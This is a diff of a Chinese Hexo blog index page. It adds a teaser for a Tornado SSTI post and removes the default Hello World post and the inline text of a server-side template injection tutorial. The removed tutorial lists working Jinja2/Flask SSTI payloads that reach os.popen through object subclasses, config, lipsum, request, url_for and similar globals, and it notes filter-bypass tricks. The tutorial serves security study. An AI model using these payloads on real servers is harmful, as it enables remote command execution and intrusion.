@@ -181,6 +181,36 @@
         
 
 <div class="post">
+    <a href="/2025/05/28/SSTI%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF/">
+        <h2 class="post-title">SSTI其他框架</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/5/28
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h1 id="Tornado框架SSTI漏洞深度解析"><a href="#Tornado框架SSTI漏洞深度解析" class="headerlink" title="Tornado框架SSTI漏洞深度解析"></a>Tornado框架SSTI漏洞深度解析</h1>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2025/05/28/SSTI%E5%85%B6%E4%BB%96%E6%A8%A1%E6%9D%BF/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2025/05/28/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
         <h2 class="post-title">SSTI漏洞总结</h2>
     </a>
@@ -198,90 +228,7 @@
     <div class="description">
         <div class="content" v-pre>
             
-            <h1 id="服务器端模板注入-SSTI-漏洞原理与利用"><a href="#服务器端模板注入-SSTI-漏洞原理与利用" class="headerlink" title="服务器端模板注入(SSTI)漏洞原理与利用"></a>服务器端模板注入(SSTI)漏洞原理与利用</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Web应用在接收攻击者的恶意输入后，未经处理直接作为模板内容的一部分。模板引擎在编译渲染过程中执行了攻击者插入的破坏性语句，从而达成攻击目的。</p>
-<h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><h3 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h3><ul>
-<li><strong>render_template()</strong>：用于渲染指定模板文件</li>
-<li><strong>render_template_string()</strong>：用于直接渲染字符串</li>
-</ul>
-<h3 id="类继承关系"><a href="#类继承关系" class="headerlink" title="类继承关系"></a>类继承关系</h3><p>关键魔术方法：</p>
-<ul>
-<li><code>__class__</code>：获取当前对象的类</li>
-<li><code>__base__</code>：获取父类（可连续使用追溯基类）</li>
-<li><code>__mro__</code>：直接查看完整继承链（通过下标指定类）</li>
-<li><code>__subclasses__</code>：获取所有子类</li>
-<li><code>__init__</code>：类初始化方法</li>
-<li><code>__globals__</code>：获取方法关联的全局变量字典</li>
-</ul>
-<h3 id="常用基础类"><a href="#常用基础类" class="headerlink" title="常用基础类"></a>常用基础类</h3><pre><code class="language-python">&#39;&#39;.__class__    # &amp;lt;class &#39;str&#39;&amp;gt;
-().__class__    # &amp;lt;class &#39;tuple&#39;&amp;gt;
-[].__class__    # &amp;lt;class &#39;list&#39;&amp;gt;
-&#123;&#125;.__class__    # &amp;lt;class &#39;dict&#39;&amp;gt;
-</code></pre>
-<h2 id="基础Payload示例"><a href="#基础Payload示例" class="headerlink" title="基础Payload示例"></a>基础Payload示例</h2><pre><code class="language-python"># 通过字符串类追溯object执行命令
-&#123;&#123; ''.__class__.__base__.__subclasses__()[138].__init__.__globals__['popen']('whoami').read() &#125;&#125;
-
-# 通过列表类执行命令
-&#123;&#123; [].__class__.__base__.__subclasses__()[134].__init__.__globals__['popen']('whoami').read() &#125;&#125;
-
-# 使用__builtins__导入os模块
-&#123;&#123; lipsum.__globals__.__builtins__.__import__('os').popen('ls').read() &#125;&#125;
-</code></pre>
-<p>#其他的一些payload</p>
-<pre><code class="language-python">print([].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read())
-
-print([].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read())
-
-print([].__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;))
-
-print([].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read())
-
-print([].__class__.__base__.__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read())
-
-print([].__class__.__bases__[0].__subclasses__()[134].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;whoami&#39;).read()&quot;))
-
-print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[83].__init__.__globals__[&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read())
-</code></pre>
-<h2 id="Jinja2模板注入"><a href="#Jinja2模板注入" class="headerlink" title="Jinja2模板注入"></a>Jinja2模板注入</h2><p>jinjia2可以通过的方式来查询配置信息，它的基础类是可以是很多，主要看config的设置环境如属于jinja2.runtime.Context，如果环境中未定义config则会属于jinja2.runtime.undefined，通过这个类我们可以快速从它的globals变量中找到os，__import__等方法，从而快速达到命令执行。</p>
-<h3 id="通过config对象"><a href="#通过config对象" class="headerlink" title="通过config对象"></a>通过config对象</h3><pre><code class="language-python">&#123;&#123; config.__class__.__init__.__globals__['os'].popen('whoami').read() &#125;&#125;
-&#123;&#123; config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() &#125;&#125;
-</code></pre>
-<h3 id="其他常用对象利用"><a href="#其他常用对象利用" class="headerlink" title="其他常用对象利用"></a>其他常用对象利用</h3><h4 id="lipsum"><a href="#lipsum" class="headerlink" title="lipsum"></a>lipsum</h4><p>通过它的全局类也能够获取到大量能够用于命令执行的函数。</p>
-<pre><code class="language-python">&#123;&#123; lipsum.__globals__['os'].popen('whoami').read() &#125;&#125;
-&#123;&#123; lipsum.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read() &#125;&#125;
-</code></pre>
-<h4 id="request对象"><a href="#request对象" class="headerlink" title="request对象"></a>request对象</h4><p>这是flask中代表当前请求的request对象，通过这个请求对象可以查询配置信息，构造出SSTI所需的类，还可以构造出SSTI所需的一些符号</p>
-<pre><code class="language-python">&#123;&#123; request.__init__.__globals__.__builtins__.__import__('os').popen('whoami').read() &#125;&#125;
-</code></pre>
-<h4 id="url-for"><a href="#url-for" class="headerlink" title="url_for"></a>url_for</h4><ul>
-<li><code>url_for</code>会根据传入的路由器函数名,返回该路由对应的URL</li>
-</ul>
-<pre><code class="language-python">&#123;&#123; url_for.__globals__['current_app'].config &#125;&#125;  # 获取配置信息
-&#123;&#123;url_for.__globals__['__builtins__']['__import__']('os').popen('whoami').read()&#125;&#125;
-&#123;&#123; url_for.__globals__['os'].popen('whoami').read() &#125;&#125;
-</code></pre>
-<h4 id="get-flashed-messages"><a href="#get-flashed-messages" class="headerlink" title="get_flashed_messages"></a>get_flashed_messages</h4><ul>
-<li><code>get_flashed_messages</code>是一个用于获取闪存消息的函数。闪存消息是一种特殊类型的消息，用于在请求之间传递信息。它通常用于在重定向或页面刷新后向用户显示一次性的提示或通知</li>
-</ul>
-<pre><code class="language-python">&#123;&#123; get_flashed_messages.__globals__['current_app'].config &#125;&#125;
-&#123;&#123;get_flashed_messages.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()")&#125;&#125;
-&#123;&#123; get_flashed_messages.__globals__['os'].popen('whoami').read() &#125;&#125;
-</code></pre>
-<h4 id="g对象"><a href="#g对象" class="headerlink" title="g对象"></a>g对象</h4><p>在Flask框架中，g对象是一个上下文全局变量，它是一个在视图函数之间共享数据的地方。它可用于存储在同一请求周期内的数据，比如数据库连接、用户信息等。在每个请求中，g对象在视图函数之间被共享，但是在不同的请求之间是不共享的。通过g对象同样也可以寻找了builtins达到getshell的效果。这里需要注意的是g对象有时候会报undefined的错误，如在以下两种不同代码使用不同的模板渲染返回中会存在不一样的情况。</p>
-<pre><code class="language-python">&#123;&#123; g["pop"].__globals__['__builtins__']['eval']("__import__('os').popen('whoami').read()") &#125;&#125;
-</code></pre>
-<h2 id="特殊类索引参考"><a href="#特殊类索引参考" class="headerlink" title="特殊类索引参考"></a>特殊类索引参考</h2><pre><code class="language-python"># 包含__import__方法的类索引参考
-80 &amp;lt;class &#39;_frozen_importlib._ModuleLock&#39;&amp;gt;
-81 &amp;lt;class &#39;_frozen_importlib._DummyModuleLock&#39;&amp;gt;
-82 &amp;lt;class &#39;_frozen_importlib._ModuleLockManager&#39;&amp;gt;
-83 &amp;lt;class &#39;_frozen_importlib.ModuleSpec&#39;&amp;gt;
-</code></pre>
-<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
-<li><strong>环境差异</strong>：子类索引号会因Python版本和环境变化</li>
-<li><strong>输出读取</strong>：popen返回对象需使用<code>.read()</code>获取输出</li>
-<li><strong>上下文限制</strong>：部分对象（如g）在不同渲染方式中可用性不同</li>
-<li><strong>过滤绕过</strong>：可通过字符串拼接、属性链等方式绕过安全过滤</li>
-</ol>
-
+            <h1 id="服务器端模板注入-SSTI-漏洞原理与利用"><a href="#服务器端模板注入-SSTI-漏洞原理与利用" class="headerlink" title="服务器端模板注入(SSTI)漏洞原理与利用"></a>服务器端模板注入(SSTI)漏洞原理与利用</h1>
             
         </div>
     </div>
@@ -291,49 +238,6 @@ print(&quot;&quot;.__class__.__bases__[0].__subclasses__()[83].__init__.__global
         
     </div>
     <a href="/2025/05/28/SSTI%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2025/05/28/hello-world/">
-        <h2 class="post-title">Hello World</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2025/5/28
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="language-bash">$ hexo new &quot;My New Post&quot;
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="language-bash">$ hexo server
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="language-bash">$ hexo generate
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="language-bash">$ hexo deploy
-</code></pre>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2025/05/28/hello-world/" class="go-post">阅读全文</a>
 </div>
 
 
